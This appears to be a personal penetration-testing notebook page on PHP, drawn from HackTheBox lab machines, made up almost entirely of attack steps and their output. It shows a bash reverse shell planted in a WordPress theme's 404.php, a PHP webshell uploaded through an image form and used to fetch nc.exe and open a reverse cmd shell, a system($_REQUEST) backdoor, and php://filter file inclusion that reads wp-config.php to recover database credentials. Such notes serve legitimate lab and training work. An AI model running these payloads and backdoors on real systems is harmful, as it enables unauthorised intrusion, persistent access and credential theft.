# 🤖 PHP
Tags: 
Related to: 
See also: 
Previous: [[PROGRAMMING]]

---

## Description


## Usage Examples

### Start PHP server

	php -S 127.0.0.1:8080

### RCE

#### exec()

Navigate to WordPress => Users:

	http://10.10.110.100:65000/wordpress/wp-admin/users.php	// james has admin privileges

Navigate to Appearance => Theme Editor:

	http://10.10.110.100:65000/wordpress/wp-admin/theme-editor.php	// select theme Twenty Twenty
	
Insert PHP code into 404.php:
	
	<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.173/9001 0>&1'"); ?>

Execute PHP code:

	firefox http://10.10.110.100:65000/wordpress/wp-content/themes/twentynineteen/404.php

---

The registration form has the option to upload an image. Save the below code to shell.php and upload it using the form.

	vi shell.php

```
<?php echo exec($_GET["cmd"]);?>
```

Click on Submit to complete registration and upload the webshell. The web shell can be accessed at:

	proxychains firefox http://172.16.1.13/discuss/ups/shell.php?cmd=whoami	// dante-ws01\gerald

Let's upgrade to a proper shell. Upload netcat to target:

	ifconfig tun0										// local IP 10.10.16.52
	cd "/home/kali/HTB/Pro Labs/Dante/www"
	cp /usr/share/windows-resources/binaries/nc.exe .
	python3 -m http.server 80
	
	proxychains firefox http://172.16.1.13/discuss/ups/shell.php?cmd=powershell wget 10.10.16.52/nc.exe -o nc.exe

	nc -lvnp 9001	// locally
	
	proxychains firefox http://172.16.1.13/discuss/ups/shell.php?cmd=nc.exe -e cmd.exe 10.10.16.52 9001

```
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\discuss\ups>
```

#### system($_REQUEST)

- PHP system() is just like the C version of the function in that it executes the given command and outputs the result.

- PHP $_REQUEST is a super global variable which is used to collect data after submitting an HTML form.

Add to existing PHP file:

	system($_REQUEST['pwn']);

Add to empty PHP file:

	<?php system($_REQUEST['pwn']); ?>

Exploit:

http://10.129.171.59/templates/protostar/htb.php?pwn=id	// uid=33(www-data) gid=33(www-data) groups=33(www-data) 

#### shell_exec()

	less /var/www/internal/main.php
	
```
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
```

### Using wrappers to access files/directories[^1]

	proxychains firefox http://172.16.1.10/wordpress	// not directly accessible
	proxychains firefox http://172.16.1.10/nav.php?page=/var/www/html/index.html			// It works
	proxychains firefox http://172.16.1.10/nav.php?page=/var/www/html/wordpress/index.php	// 500 error

The error message confirms that the WordPress is installed in the web root. In general, WordPress stores the database configuration in the file wp-config.php.

PHP provides various wrappers [^3], which can be used for easier access of files, protocols or streams. A complete list of wrappers can be found here. The php:// wrapper is enabled by default and is used to interact with IO streams. For example: php://stdin and php://stdout can be used to access input and output streams for the process, while php://input and php://output are used to access request data. A useful wrapper is php://filter , which can be chained with multiple filters to achieve the desired output.

For example, the filter php://filter/read=/resource=/etc/passwd reads the resource /etc/passwd and outputs the contents. The read filter can be used to process the input with various string operations, such as base64 encoding, ROT13 encoding etc.

The following filters will convert the contents of /etc/passwd to base64 and ROT13 respectively.

	php://filter/read=convert.base64-encode/resource=/etc/passwd
	php://filter/read=string.rot13/resource=/etc/passwd

Let's try base64 encoding and including wp-config.php using the filter.

	proxychains firefox http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php

```
PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJyAnd29yZHByZXNzJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnbWFyZ2FyZXQnICk7DQoNCi8qKiBNeVNRTCBkYXRhYmFzZSBwYXNzd29yZCAqLw0KZGVmaW5lKCAnREJfUEFTU1dPUkQnLCAnV2VsY29tZTEhMkAzIycgKTsNCg0KLyoqIE15U1FMIGhvc3RuYW1lICovDQpkZWZpbmUoICdEQl9IT1NUJywgJ2xvY2FsaG9zdCcgKTsNCg0KLyoqIERhdGFiYXNlIENoYXJzZXQgdG8gdXNlIGluIGNyZWF0aW5nIGRhdGFiYXNlIHRhYmxlcy4gKi8NCmRlZmluZSggJ0RCX0NIQVJTRVQnLCAndXRmOCcgKTsNCg0KLyoqIFRoZSBEYXRhYmFzZSBDb2xsYXRlIHR5cGUuIERvbid0IGNoYW5nZSB0aGlzIGlmIGluIGRvdWJ0LiAqLw0KZGVmaW5lKCAnREJfQ09MTEFURScsICcnICk7DQoNCi8qKiNAKw0KICogQXV0aGVudGljYXRpb24gVW5pcXVlIEtleXMgYW5kIFNhbHRzLg0KICoNCiAqIENoYW5nZSB0aGVzZSB0byBkaWZmZXJlbnQgdW5pcXVlIHBocmFzZXMhDQogKiBZb3UgY2FuIGdlbmVyYXRlIHRoZXNlIHVzaW5nIHRoZSB7QGxpbmsgaHR0cHM6Ly9hcGkud29yZHByZXNzLm9yZy9zZWNyZXQta2V5LzEuMS9zYWx0LyBXb3JkUHJlc3Mub3JnIHNlY3JldC1rZXkgc2VydmljZX0NCiAqIFlvdSBjYW4gY2hhbmdlIHRoZXNlIGF0IGFueSBwb2ludCBpbiB0aW1lIHRvIGludmFsaWRhdGUgYWxsIGV4aXN0aW5nIGNvb2tpZXMuIFRoaXMgd2lsbCBmb3JjZSBhbGwgdXNlcnMgdG8gaGF2ZSB0byBsb2cgaW4gYWdhaW4uDQogKg0KICogQHNpbmNlIDIuNi4wDQogKi8NCmRlZmluZSggJ0FVVEhfS0VZJywgICAgICAgICAncHV0IHlvdXIgdW5pcXVlIHBocmFzZSBoZXJlJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfS0VZJywgICdwdXQgeW91ciB1bmlxdWUgcGhyYXNlIGhlcmUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScgKTsNCmRlZmluZSggJ05PTkNFX0tFWScsICAgICAgICAncHV0IHlvdXIgdW5pcXVlIHBocmFzZSBoZXJlJyApOw0KZGVmaW5lKCAnQVVUSF9TQUxUJywgICAgICAgICdwdXQgeW91ciB1bmlxdWUgcGhyYXNlIGhlcmUnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScgKTsNCmRlZmluZSggJ0xPR0dFRF9JTl9TQUxUJywgICAncHV0IHlvdXIgdW5pcXVlIHBocmFzZSBoZXJlJyApOw0KZGVmaW5lKCAnTk9OQ0VfU0FMVCcsICAgICAgICdwdXQgeW91ciB1bmlxdWUgcGhyYXNlIGhlcmUnICk7DQoNCi8qKiNALSovDQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqDQogKiBZb3UgY2FuIGhhdmUgbXVsdGlwbGUgaW5zdGFsbGF0aW9ucyBpbiBvbmUgZGF0YWJhc2UgaWYgeW91IGdpdmUgZWFjaA0KICogYSB1bmlxdWUgcHJlZml4LiBPbmx5IG51bWJlcnMsIGxldHRlcnMsIGFuZCB1bmRlcnNjb3JlcyBwbGVhc2UhDQogKi8NCiR0YWJsZV9wcmVmaXggPSAnd3BfJzsNCg0KLyoqDQogKiBGb3IgZGV2ZWxvcGVyczogV29yZFByZXNzIGRlYnVnZ2luZyBtb2RlLg0KICoNCiAqIENoYW5nZSB0aGlzIHRvIHRydWUgdG8gZW5hYmxlIHRoZSBkaXNwbGF5IG9mIG5vdGljZXMgZHVyaW5nIGRldmVsb3BtZW50Lg0KICogSXQgaXMgc3Ryb25nbHkgcmVjb21tZW5kZWQgdGhhdCBwbHVnaW4gYW5kIHRoZW1lIGRldmVsb3BlcnMgdXNlIFdQX0RFQlVHDQogKiBpbiB0aGVpciBkZXZlbG9wbWVudCBlbnZpcm9ubWVudHMuDQogKg0KICogRm9yIGluZm9ybWF0aW9uIG9uIG90aGVyIGNvbnN0YW50cyB0aGF0IGNhbiBiZSB1c2VkIGZvciBkZWJ1Z2dpbmcsDQogKiB2aXNpdCB0aGUgZG9jdW1lbnRhdGlvbi4NCiAqDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyogVGhhdCdzIGFsbCwgc3RvcCBlZGl0aW5nISBIYXBweSBwdWJsaXNoaW5nLiAqLw0KDQovKiogQWJzb2x1dGUgcGF0aCB0byB0aGUgV29yZFByZXNzIGRpcmVjdG9yeS4gKi8NCmlmICggISBkZWZpbmVkKCAnQUJTUEFUSCcgKSApIHsNCglkZWZpbmUoICdBQlNQQVRIJywgX19ESVJfXyAuICcvJyApOw0KfQ0KDQovKiogU2V0cyB1cCBXb3JkUHJlc3MgdmFycyBhbmQgaW5jbHVkZWQgZmlsZXMuICovDQpyZXF1aXJlX29uY2UgQUJTUEFUSCAuICd3cC1zZXR0aW5ncy5waHAnOw0K
```

Let's decode the contents to a file:

	proxychains curl "172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php" | base64 -d > wp-config.php

```
/ ** MySQL settings - You can get this info from your web host ** //
/ ** The name of the database for WordPress */
define( 'DB_NAME' 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'margaret' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );
```

---
## References
[^1]: https://www.php.net/manual/en/wrappers.php